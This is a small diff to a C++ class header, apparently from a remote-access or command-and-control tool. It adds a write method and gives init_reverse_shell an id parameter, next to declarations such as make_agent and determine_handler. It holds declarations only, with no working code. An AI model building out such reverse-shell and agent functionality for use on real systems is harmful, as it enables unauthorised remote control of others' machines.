@@ -37,6 +37,7 @@ public:
     int send_err() override;
     int listen(int socket) override;
     int read(char **buff, int length) override;
+    int write(char *buff, int length) override;
     pClientDat get_data() override;
 
     int determine_handler() override;
@@ -46,5 +47,5 @@ public:
     int get_info(char *ptr) override;
     //int handle(void *sess) override;
     void make_agent(char *dat_ptr, char *d_ptr) override;
-    int init_reverse_shell() override;
+    int init_reverse_shell(char *id) override;
 };
